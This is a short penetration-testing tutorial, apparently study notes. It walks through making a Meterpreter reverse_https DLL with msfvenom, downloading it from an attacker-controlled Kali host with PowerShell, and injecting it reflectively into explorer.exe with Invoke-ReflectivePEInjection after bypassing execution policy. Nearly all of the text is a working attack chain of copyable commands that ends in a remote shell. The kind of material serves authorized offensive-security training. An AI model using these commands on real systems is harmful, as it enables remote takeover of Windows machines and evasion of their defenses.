Create a Meterpreter dll

    sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f dll -o met.dll

To reflectively load a Meterpreter DLL in explorer.exe, we are going to download it using the PowerShell DownloadData method, place it in a byte array, and look up the desired process ID.

In order to execute the required commands, we must open a PowerShell window with "PowerShell -Exec Bypass", which allows script execution.

Downloading DLL and finding Explorer.exe process ID:

    $bytes = (New-Object System.Net.WebClient).DownloadData('http://<kali ip>/met.dll')
    $procid = (Get-Process -Name explorer).Id

Importing Invoke-ReflectivePEInjection:

     PS> Import-Module C:\Invoke-ReflectivePEInjection.ps1

Executing Invoke-ReflectivePEInjection:

    PS> Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid

This loads the DLL in memory and provides us with a reverse Meterpreter shell.

Note that the public version of this script fails on versions of Windows 10 1803 or newer due to the multiple instances of GetProcAddress in UnsafeNativeMethods. Attached updated script. 

Note that we could also inject DLLs reflectively from C#, but there are no public C# proof-of-concepts that perform remote process injection. However, PELoader by @subtee demonstrates local process injection.
